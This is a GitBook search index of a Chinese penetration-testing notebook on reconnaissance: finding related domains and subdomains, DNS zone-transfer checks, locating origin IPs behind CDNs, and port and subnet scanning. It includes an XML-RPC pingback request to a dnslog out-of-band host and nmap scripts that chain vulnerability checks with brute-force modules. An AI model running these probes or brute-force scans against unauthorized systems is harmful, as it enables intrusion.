{"./":{"url":"./","title":"Introduction","keywords":"","body":" Introduction 关于我 Introduction 个人的部分知识技能，倾向于使用知识库的方式进行总结回顾自己，后续会不断完善，抓住2021年最后的尾巴！ 关于我 邮箱：damit5#protonmail.com GitHub：https://github.com/damit5/ 小时候我爱吃西红柿🍅 我以为我一辈子都会爱下去 后来长大了发现没那么爱了 我没错 西红柿也没错 错的是那自以为是的一生 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-18 21:17:38 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/","title":"01.主域名收集","keywords":"","body":"信息收集之主域名收集方法 我们获取了一个目标后，第一时间应该尽可能的发现更多的关联资产，扩大我们的攻击面 [!DANGER|style:flat] 而网上大多数文章第一步就是直接子域名收集了，也没讲怎么收集关联资产，为了获取更多的目标，这里也系统的总结一下 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 13:55:04 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/01.ICP备案查询.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/01.ICP备案查询.html","title":"01.ICP备案查询","keywords":"","body":" ICP备案查询 什么是ICP备案 有何作用 如何查询 第三方查询网站 ICP备案查询 什么是ICP备案 ICP备案是指网站在信息产业部提交网站信息进行官方认可。对国内各大小网站(包括企业及个人站点)的严格审查工作，对于没有合法备案的非经营性网站或没有取得ICP许可证的经营性网站，根据网站性质，将予以罚款，严重的关闭网站，以此规范网络安全，打击一切利用网络资源进行不法活动的犯罪行为。也就是说，只要是盈利为目的的网站，都要进行ICP备案，否则会受到相应的处罚。 国内使用国内服务器的网站，都必须要先办理ICP备案后才可以上线。 有何作用 通过查询目标企业的备案信息，可直接获取到目标企业注册了哪些域名，从而增加可渗透的目标范围。 如何查询 [!TIP] 推荐使用官方网站ICP/IP地址/域名信息备案管理系统 支持使用单位名称、域名和备案号进行查询 使用单位名称查询 使用域名查询 使用备案号查询 使用任意参数查询后，可通过相关的信息查询其他相关的域名达到收集目标域名的目的。 第三方查询网站 ICP备案查询 - 站长工具 站长seo综合查询工具-爱站网 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 13:31:22 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/02.WHOIS查询.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/02.WHOIS查询.html","title":"02.WHOIS查询","keywords":"","body":" WHOIS查询 什么是WHOIS 有何作用 如何查询 Linux本地WHOIS查询 在线查询网站 在线查询演示 WHOIS查询 什么是WHOIS WHOIS是用来查询互联网中域名的IP以及所有者等信息的传输协议。早期的WHOIS查询多以命令行接口存在，但是现在出现了一些基于网页接口的简化在线查询工具，甚至可以一次向不同的数据库查询。网页接口的查询工具仍然依赖WHOIS协议向服务器发送查询请求，命令行接口的工具仍然被系统管理员广泛使用。 有何作用 通过查询目标的WHOIS信息，对联系人、联系邮箱等信息进行反查，获取更多相关的域名信息。 重点关注注册商、注册人、邮件、DNS解析服务器、注册人联系电话。 如何查询 Linux本地WHOIS查询 在线查询网站 域名Whois查询 - 站长之家 站长工具whois查询工具爱站网 国家域名whois 全球 WHOIS 查询 域名信息查询 - 腾讯云 whois查询-中国万网 在线查询演示 此处以站长之家查询为例，输入域名即可进行查询 点击联系人后方的 whois反查 进行联系人反查 点击联系邮箱后方的 whois反查 进行邮箱反查 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 13:34:29 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/03.证书查询.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/03.证书查询.html","title":"03.证书查询","keywords":"","body":" 证书查询 什么是证书 有何作用 如何查询 浏览器直接查看 通过在线网站 通过网络空间搜索引擎 证书查询 什么是证书 SSL证书是一种遵守SSL协议的服务器数字证书，由受信任的根证书颁发机构颁发。 SSL证书采用SSL协议进行通信，SSL证书部署到服务器后，服务器端的访问将启用HTTPS协议。 您的网站将会通过HTTPS加密协议来传输数据，可帮助服务器端和客户端之间建立加密链接，从而保证数据传输的安全。 有何作用 通过查询共用SSL证书的网站，可以找到相关的其他域名。 如何查询 此处推荐3种方法。 浏览器直接查看 点击更多信息 选择“安全-->查看证书” 可以看到很多的主域名 通过在线网站 [!TIP] 推荐使用 crt.sh 输入域名即可查询 通过网络空间搜索引擎 [!NOTE] 以Fofa为例，shodan和zoomeye类似 可查询fofa语法手册： 语法 说明 cert=\"baidu\" 搜索证书(https或者imaps等)中带有baidu的资产。 cert.subject=\"Oracle Corporation\" 搜索证书持有者是Oracle Corporation的资产 cert.issuer=\"DigiCert\" 搜索证书颁发者为DigiCert Inc的资产 cert.is_valid=true 验证证书是否有效，true有效，false无效 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 13:44:33 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/04.DNS共享记录查询.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/04.DNS共享记录查询.html","title":"04.DNS共享记录查询","keywords":"","body":" DNS共享记录查询 什么是DNS 有何作用 如何查询 DNS共享记录查询 什么是DNS DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区。 有何作用 此处通过查询共享DNS服务器的主机来获取到相关的域名； 需要注意的是，如果是公开的DNS服务器，那么查询的效果将会特别差。 如何查询 首先查询目标是否存在自建的NS服务器 将获取到的NS服务器带入 https://hackertarget.com/find-shared-dns-servers/ 进行查询 此处查询的结果并不全是属于目标范围，需要进一步的确认和观察。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 13:46:10 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/05.IP反查.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/01.主域名收集/05.IP反查.html","title":"05.IP反查","keywords":"","body":" IP反查 有何作用 如何查询 IP反查 有何作用 目标多个域名可能绑定在同一IP上，通过IP反查一定情况下可获取到其他的域名信息。 如何查询 [!TIP] 同IP网站查询，同服务器网站查询 - 站长工具 Online investigation tool - Reverse IP, NS, MX, WHOIS and Search Tools 输入相关的域名或IP地址即可查询。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 13:46:41 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/","title":"02.子域名收集","keywords":"","body":" 信息收集之子域名收集 参考链接 信息收集之子域名收集 前面总结了主域名收集的思路和方法，但除了主域名外，子域名也是域名信息收集中的一个重要环节，在当今各种防护设备满天飞的情况下，想要拿下主域名越来越难，但我们可以使用迂回策略，从子域名下手，慢慢靠近主域名以达到shell的目的。 子域名收集可以帮助我们发现目标对外开放的更多的资产，如果能找到一些被遗忘或目标不关注的子域名，将其作为突破点，可能达到事半功倍的效果。 子域名收集的方式很多，但如何尽可能全的收集到所有的子域名却不是那么容易的事儿；本次将从手工和工具两种方式进行总结。 参考链接 红蓝对抗之域名搜集方法总结 子域名收集笔记 从代码角度看各类子域名收集工具 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:14:20 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/01.证书透明度.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/01.证书透明度.html","title":"01.证书透明度","keywords":"","body":" 证书透明度收集子域 介绍 收集方法 证书透明度收集子域 介绍 要向用户提供加密流量，网站必须先向可信的证书授权中心 (CA) 申请证书。然后，当用户尝试访问相应网站时，此证书即会被提供给浏览器以验证该网站。近年来，由于 HTTPS 证书系统存在结构性缺陷，证书以及签发证书的 CA 很容易遭到入侵和操纵。Google 的证书透明度项目旨在通过提供一个用于监测和审核 HTTPS 证书的开放式框架，来保障证书签发流程安全无虞。 收集方法 可以通过以下链接进行在线查询： crtsh entrust censys google spyse certspotter（每小时免费查询100次） facebook（需要登录） 输入域名，即可查询 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:01:02 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/02.DNS域传送.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/02.DNS域传送.html","title":"02.DNS域传送","keywords":"","body":" DNS域传送 介绍 检测方法 nslookup dig nmap DNS域传送 介绍 DNS服务器分为主服务器，备份服务器，缓存服务器。 域传送是指备份服务器从主服务器上复制数据，然后更新自身的数据库，以达到数据同步的目的，这样是为了增加冗余，一旦主服务器出现问题可直接让备份服务器做好支撑工作。 而域传送漏洞则是由于DNS配置不当，导致匿名用户可以获取某个域的所有记录，造成整个网络的拓扑结构泄露给潜在的攻击者，凭借这份网络蓝图，攻击者可以节省大量的扫描时间，同时提升了目标的准确度。 检测方法 nslookup # 查询nameserver nslookup -type=ns knownsec.com 119.29.29.29 # 指定nameserver，列举域名信息 nslookup server f1g1ns1.dnspod.net ls knownsec.com [!NOTE] 如果提示无法列出域，那就说明此域名不存在域传送漏洞。 dig axfr 是q-type类型的一种，axfr类型是Authoritative Transfer的缩写，指请求传送某个区域的全部记录。 我们只要欺骗dns服务器发送一个axfr请求过去，如果该dns服务器上存在该漏洞，就会返回所有的解析记录值 # 找到NS服务器 dig knownsec.com ns # 发送axfr请求 dig axfr @f1g1ns2.dnspod.net knownsec.com nmap nmap的脚本dns-zone-transfer可以帮我们探测是否存在域传送漏洞 nmap --script dns-zone-transfer --script-args dns-zone-transfer.domain=knownsec.com -p 53 -Pn f1g1ns1.dnspod.net Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:05:19 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/03.DNS公开数据集.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/03.DNS公开数据集.html","title":"03.DNS公开数据集","keywords":"","body":" DNS公开数据集 介绍 收集方法 DNS公开数据集 介绍 Rapid7的开源数据项目收集了多种全互联网范围内的扫描数据，任何人都可下载这些数据，而本次主题中主要涉及两个数据集，分别是FDNS和RDNS，可从中获取到大量的子域名信息。 收集方法 Find DNS Host Records (Subdomains) netcraft Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:06:14 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/04.搜索引擎.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/04.搜索引擎.html","title":"04.搜索引擎","keywords":"","body":" 搜索引擎 介绍 收集方法 普通搜索引擎 空间搜索引擎 搜索引擎 介绍 搜索引擎通过对互联网进行大量爬行后，往往收集了大量的子域名，只需要输入对应的语法，就可以从搜索引擎的数据库中查询到我们想要的内容。 收集方法 普通搜索引擎 此处以Google为例，使用减号来排除不想收集到的子域名 site:knownsec.com -www 空间搜索引擎 此处以zoomeye为例 https://www.zoomeye.org/searchResult?q=site%3A%20knownsec.com site: knownsec.com Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:06:51 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/05.信息泄露.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/05.信息泄露.html","title":"05.信息泄露","keywords":"","body":" 信息泄露 网站爬虫 文件泄漏 代码仓库 信息泄露 网站爬虫 很多网站的页面中，会有跳转到其他系统的功能，如OA、邮箱系统等，其中可能就包含有其他子域名相关的信息，此外部署了内容安全策略（CSP）的网站在header头Content-Security-Policy中，也可能存在域名的信息。可使用burpsuite或者awvs类工具对站点进行爬取分析。 文件泄漏 很多网站有跨域策略文件crossdomain.xml、站点地图sitemap.xml和robots.txt等，其中也可能存在子域名的信息。 代码仓库 [!NOTE] 此处以GitHub为例，其他的如gitlab、gitee都可以尝试 在GitHub中直接搜索域名关键词，除了可以发现敏感的泄漏信息外，也可以发现部分子域名信息。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:09:06 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/06.第三方在线平台.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/06.第三方在线平台.html","title":"06.第三方在线平台","keywords":"","body":" 第三方在线平台 介绍 收集方法 第三方在线平台 介绍 通过第三方在线平台提供的一些服务，可以快速发现部分子域名。 使用各种搜索引擎搜索关键词 在线子域名查询 即可快速寻找到一些直接可用的在线平台 收集方法 Find DNS Host Records | Subdomain Finder | HackerTarget.com DNSdumpster.com - dns recon and research, find and lookup dns records virustotal 域名查iP 域名解析 iP查询网站 iP反查域名 iP反查网站 同一iP网站 同iP网站域名iP查询 threatminer Subdomain Finder threatbook（需要高级权限） 子域名查询 - 站长工具（需要登录） Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:10:01 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/07.子域名枚举爆破.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/07.子域名枚举爆破.html","title":"07.子域名枚举爆破","keywords":"","body":" 子域名枚举爆破 介绍 收集方法 子域名枚举爆破 介绍 所谓子域名枚举爆破，就是通过不断的拼接字典中的子域名前缀去枚举域名的A记录，如gm7.org拼接前缀test组合成test.gm7.org，再对其进行验证，但是该方法一般需要解决泛解析问题。 收集方法 获取一些常见子域名前缀后，整理成字典，依次拼接主域名在浏览器进行访问验证即可，或通过nslookup进行验证即可。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 14:12:38 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/08.工具自动化.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/08.工具自动化.html","title":"08.工具自动化","keywords":"","body":" 工具自动化 OneForAll ksubdomain JSINFO-SCAN Layer子域名挖掘机 工具自动化 通过前面手工部分的讲解，可以看到大多收集步骤均为重复性的工作，那如果把所有的手工操作都自动化结合成一个工具，那么肯定能够达到事半功倍的效果。 OneForAll https://github.com/shmilylty/OneForAll 解决大多传统子域名收集工具不够强大、不够友好、缺少维护和效率问题的痛点，是一款集百家之长，功能强大的全面快速子域收集终极神器。 ksubdomain https://github.com/knownsec/ksubdomain ksubdomain是一款基于无状态子域名爆破工具，支持在Windows/Linux/Mac上使用，它会很快的进行DNS爆破，在Mac和Windows上理论最大发包速度在30w/s,linux上为160w/s的速度。 JSINFO-SCAN https://github.com/p1g3/JSINFO-SCAN 递归爬取域名(netloc/domain)，以及递归从JS中获取信息的工具 Layer子域名挖掘机 https://github.com/euphrat1ca/LayerDomainFinder Layer子域名挖掘机是一款子域名收集工具，拥有简洁的界面和简单的操作模式，支持服务接口查询和暴力枚举获取子域名信息，同时可以通过已获取的域名进行递归爆破。 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 14:25:13 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/09.构造域名.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/09.构造域名.html","title":"09.构造域名","keywords":"","body":" 构造域名 altdns 构造域名 前面通过各种收集方式已经获取到了大量的子域名了，但这真的就是全部了吗？？当然不是！！！！ 我们可以通过置换再生成一批域名，比如我们收集到admin.aaa.xxx.com，那么是不是也可能存在一个dev-admin.aaa.xxx.com呢？ 通过这种方式再生成一批，然后验证存活率，结果肯定会更全！！！ 之前自己写过工具，后面发现已经有前人写好了，那就是 altdns altdns https://github.com/infosec-au/altdns Altdns is a DNS recon tool that allows for the discovery of subdomains that conform to patterns. Altdns takes in words that could be present in subdomains under a domain (such as test, dev, staging) as well as takes in a list of subdomains that you know of. 自己看说明文档吧，可以根据经验自定义或者补充添加一些关键词... Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 14:35:06 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/10.存活性探测.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/02.子域名收集/10.存活性探测.html","title":"10.存活性探测","keywords":"","body":" 存活性探测 WebAliveScan Finger 存活性探测 获取了大量域名后，我们往往需要判断域名是否存活，域名对应的功能是什么 WebAliveScan https://github.com/broken5/WebAliveScan https://github.com/broken5/bscan 对目标域名进行快速的存活扫描、简单的指纹识别、目录扫描，一图胜千言 Finger https://github.com/EASY233/Finger 一款红队在大量的资产中存活探测与重点攻击系统指纹探测工具 python3 Finger.py -h Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 17:59:03 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/","title":"03.IP段信息收集","keywords":"","body":"获取了一些基本的信息如域名等后，为了扩大我们的攻击面，因此我们要尝试发现更多的目标，如IP段的目标 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-02 16:49:41 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/01.绕过CDN寻找真实IP.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/01.绕过CDN寻找真实IP.html","title":"01.绕过CDN寻找真实IP","keywords":"","body":" 判断是否存在CDN 多地ping nslookup法 IP反查域名 观察header 在线检测工具 寻找真实IP 网络空间测绘引擎 二级域名法 邮箱 海外ping DNS历史解析记录 SSL证书 在线 命令行工具 敏感文件泄漏 历史域名 通过 XML-RPC PINGBACK 通信 APP 漏洞 通过 virtual-host 碰撞 通过 favicon.ico 哈希特征 通过网页源码特征值 通过域名备案信息广域探测（成功率高） 找到真实 IP 后如何使用 参考 判断是否存在CDN 多地ping 如果没有使用CDN，则只会显示一个IP地址。 可以使用以下站点进行多地ping， http://ping.chinaz.com/ https://ping.aizhan.com/ http://www.webkaka.com/Ping.aspx https://www.host-tracker.com/v3/check/ 如图则不存在CDN nslookup法 用国外的dns服务器 如果返回域名解析对应多个 IP 地址多半是使用了 CDN nslookup -qt=A h5.hunbei.com 8.8.8.8 用国外的可能会得到真实IP 不存在： 存在： IP反查域名 查看是否存在大量不相关的IP https://securitytrails.com/ https://dns.aizhan.com/ https://x.threatbook.cn 如下图可以看出来是使用了CDN 观察header 观察请求响应的返回数据的头部，是否有 CDN 服务商标识 若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN 在线检测工具 https://www.cdnplanet.com/tools/cdnfinder/ https://tools.ipip.net/cdn.php https://whatsmycdn.com/ 寻找真实IP 网络空间测绘引擎 zoomeye、fofa等，搜索站点相关信息，有一定几率能够获取到站点的真实IP fofa shodan quake Censys.io 二级域名法 由于部分CDN价格昂贵，所以一些重要的站点会使用CDN加速，而一些子域名则没有使用，且极有可能和主站在同一C段，这时候，就可以通过发现目标的子域名，从而根据IP来定位主域名的IP地址。 oneforall ksubdomain Jsinfo-scan 邮箱 用目标邮件服务器发送邮件给自己(QQ邮箱)再查看邮件源码一定情况下可以找到真实IP（服务端和我们建立连接） 这里还有一个奇淫技巧，通过发送邮件给一个不存在的邮箱地址，比如 000xxx@domain.com ，因为该用户不存在，所以发送将失败，并且还会收到一个包含发送该电子邮件给你的服务器的真实 IP 通知。 RSS 订阅 邮箱注册、激活处 邮箱找回密码处 产品更新的邮件推送 某业务执行后发送的邮件通知 员工邮箱、邮件管理平台等入口处的忘记密码 海外ping 由于国内厂家可能只针对国内使用cdn，对海外没有铺设，导致通过通过海外的IP可以直接获取到真实IP。 可以使用： http://ping.chinaz.com/ https://asm.ca.com/zh_cn/ping.php http://host-tracker.com/ http://www.webpagetest.org/ https://dnscheck.pingdom.com/ 进行查询 DNS历史解析记录 https://dnsdb.io/zh-cn/ https://securitytrails.com/ https://x.threatbook.cn/ http://toolbar.netcraft.com/site_report?url= https://viewdns.info/iphistory/?domain= 以微步在线为例 找到站点 判断存在CDN 微步查询 确认为真实IP 这些很有可能就是在使用CDN之前留下的解析记录 SSL证书 在线 https://censys.io/certificates?q=parsed.names.raw%3A+%22baidu.cn%22+and+tags.raw%3A+trusted # 查询有效的证书 Certificates: parsed.names.raw: \"baidu.cn\" and tags.raw: trusted # 注意 # 测试过程中，很容易陷入思维误区，认为 有效 的证书才是我们需要的，但其实并不一定，很多服务器配置错误依然保留的是 无效 的证书 sha1 签名反查IPV4 https://crt.sh/ 命令行工具 openssl openssl s_client -connect hao123.com:443 | grep subject curl curl -v https://hao123.com | grep 'subject' 敏感文件泄漏 服务器日志文件 探针文件，例如 phpinfo 网站备份压缩文件 .DS_Store .hg .git SVN Web.xml 历史域名 很多网站在发展的过程中，会更换域名，比如京东以前的域名是 360buy.com ，后来斥巨资购买了 jd.com 。 网站在更换新域名时，如果将 CDN 部署到新的域名上，而之前的域名由于没过期，可能未使用 CDN，因此可以直接获得服务器 IP，所以，历史域名也是一个很重要的点。 通过 XML-RPC PINGBACK 通信 XML-RPC 是支持 WordPress 与其他系统之间通信的规范，它通过使用 HTTP 作为传输机制和 XML 作为编码机制来标准化这些通信过程。 在 WordPress 的早期版本中，默认情况下已关闭 XML-RPC，但是从3.5版本开始，默认情况下开启。 XML-RPC 支持 trackback 和 pingback。 虽然 WordPress 启用了 REST API 来代替 XML-RPC ，不过 XML-RPX 不会过时的，放心大胆的使用就好，虽然 XML-RPC 这个技术很老了，但依然可以通杀很多网站。 POST /xmlrpc.php HTTP/1.1 Host: domain.com Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Accept-Encoding: gzip, deflate Accept-Language: en,zh-CN;q=0.9,zh;q=0.8 Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 323 pingback.ping http://2vbis4.dnslog.cn https://domain.com/ APP 目标若存在APP，则APP可能通过IP直接与服务端进行通信，若最新版采用域名通信，也可尝试寻找历史版本进行分析。 历史版本宝贝一般很多 漏洞 如果目标网站本身存在漏洞的话，比如 SSRF、XXE、XSS、文件上传、命令执行等漏洞，或者我们找到的其他突破口，注入我们自己的带外服务器地址，然后在服务器上检查 HTTP 日志记录。 应用本身的错误会造成当传递一些错误的参数值或者错误的地址时，内部会抛出异常，也就是日常所说的报错，关注报错点，经常会泄露一些真实的 IP 地址或者内网 IP 段。 通过 virtual-host 碰撞 当我们收集了目标足够多的可能的真实 IP 时，可以通过 IP 和子域的碰撞，来批量获得命中目标以及目标哪些的子域。 在线收集工具 https://pentest-tools.com/information-gathering/find-virtual-hosts# 通过 favicon.ico 哈希特征 favicon.ico 是现代浏览器在网页标题的左侧显示的一个小图标。 该图标数据通常是从 https://anywebsite/favicon.ico 处获取的，浏览器会在浏览任何网站时自动请求它。 因为可以通过计算 favicon.ico 的指纹哈希，然后去 shodan 等搜索引擎搜索与之相同的主机结果，从而进一步探测是否能挖掘出目标网站的真实 IP 地址。 目前网络空间搜索引擎均支持 通过网页源码特征值 在服务器源 IP 地址允许访问并且返回的也是类似的网站内容情况下，可以通过侦察页面源码中 JS 、CSS 、HTML 等一系列静态特征值，然后用 Shodan 、Zoomeye 、Censys 等搜索引擎进行匹配搜索，从而定位 IP 。 通过域名备案信息广域探测（成功率高） 针对目标域名，目标二级域名，如果都做了 CDN 的情况下，是不是就思路中断了呢？ 肯定不是。这里分享一个很少有人去关注的独门秘技。 网站需要服务器，但是再土豪的公司，也不可能一个域名一台服务器，大多数情况下，都是多个域名业务，共用一台服务器。 那么如果目标网站存在备案，可以查询其备案信息，收集该单位或者个人备案的其他网站域名以及其他子域，然后再进行一轮广域的探测，很有可能其中的某个边缘子域，没有做 CDN，就直接暴露了真实服务器的 IP 地址，然后再进一步验证该 IP 是否也是目标网站的真实 IP 。 找到真实 IP 后如何使用 在获取到真实IP后，通过直接访问IP可能无法访问，那么此时提供2种思路进行解决 通过修改 hosts 文件，将域名和 IP 绑定。（要是不会，不建议阅读此文。） 如使用 burpsuite 测试，可以在 Project options ----> Connections ----> Hostname Resolution 中增加域名和 IP 记录。 参考 https://github.com/bin-maker/2021CDN/blob/main/CDN%202021%20%E5%AE%8C%E5%85%A8%E6%94%BB%E5%87%BB%E6%8C%87%E5%8D%97%EF%BC%88%E4%B8%80%EF%BC%89.md https://www.anquanke.com/post/id/227818 https://www.anquanke.com/post/id/231437 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-27 15:22:58 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/02.网络空间搜索引擎.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/02.网络空间搜索引擎.html","title":"02.网络空间搜索引擎","keywords":"","body":" 网络空间搜索引擎 关键词搜索 icon图标搜索 C段查询 网络空间搜索引擎 通过网络空间搜索引擎搜索目标IP以及C段，来快速发现目标资产的IP地址段上的端口开放情况（时间充足还是建议手动扫一遍） [!NOTE] 主要参考各产品的手册用法，以及发挥自己的思路，这里列举几个抛砖引玉 [!TIP] 尽量尝试证书、图标等各种方式，还有关键词如 body=\"南方电网\" ，不一定要全称，简写往往有更好的效果 关键词搜索 title:\"知道创宇\" +country:\"CN\" -subdivisions:\"香港\" icon图标搜索 iconhash: \"d920f3d126f9d3806bbab5412541e7b6\" C段查询 [!WARNING] 因为搜索引擎是从数据库中拿取数据，因此可能具有实效性，部分结果不准确 cidr: \"1.2.3.4/24\" 列举一些常用的搜索引擎，排名不分先后 Zomeye Fofa 360quake shodan Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 14:47:06 "},"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/03.C段扫描工具.html":{"url":"个人知识库/01.渗透测试/01.信息收集/1.资产收集/03.IP段信息收集/03.C段扫描工具.html","title":"03.C段扫描工具","keywords":"","body":" 端口&C段扫描 Nmap msscan masscan_to_nmap Goby shuize fscan ALLin 端口&C段扫描 [!NOTE] 大多数情况下扫描C段就足够了，有需要的也可以扫描B段，或者相邻的C段 手动扫描的结果是实时的，比空间搜索引擎会准确得多 这里主要介绍一些常用的扫描端口以及C段的工具 Nmap https://nmap.org/ 王牌扫描器怎么能不放第一个呢？ nmap的使用方法就不用多说了，列举一下通过不同协议不同的方式进行扫描的命令吧，是一款一直都在用的工具，缺点就是扫描速度较慢 nmap -sP 127.0.0.1 nmap -sT 127.0.0.1 nmap -sS 127.0.0.1 nmap -sU 127.0.0.1 nmap -sF 127.0.0.1 nmap -sX 127.0.0.1 nmap -sN 127.0.0.1 写一个我常用的命令吧，有需要其他参数可以按需添加 nmap -vvv -Pn -p- ip/24 -n -T4 再放两个写的快速启动的sh脚本 扫描全端口，并调用各种脚本 #!/usr/bin/env bash read -p \"ip: \" ip nmap -v -Pn -p- --open -sV $ip -n -T4 --max-scan-delay 10 --max-retries 3 --min-hostgroup 10 -oX $ip-result-`date +%y-%m-%d-%H-%M-%S`.xml --script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version,ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute 快速扫描常见端口，并调用各种脚本 #!/usr/bin/env bash read -p \"ip: \" ip nmap -vvv -Pn -p 20,22,23,25,53,69,80-89,443,8440-8450,8080-8089,110,111,137,143,161,389,512,873,1194,1352,1433,1521,1500,1723,2082,2181,2601,3128,3312,3306,3389,3690,4848,5000,5432,5900,5984,6379,7001,7002,7003,7778,8000,8069,8888,9000,9002,9080-9081,9090,9200,10001,10002,11211,27017,50070 --open -sV $ip -n -T4 --max-scan-delay 10 --max-retries 3 --min-hostgroup 10 -oX $ip-result-`date +%y-%m-%d-%H-%M-%S`.xml 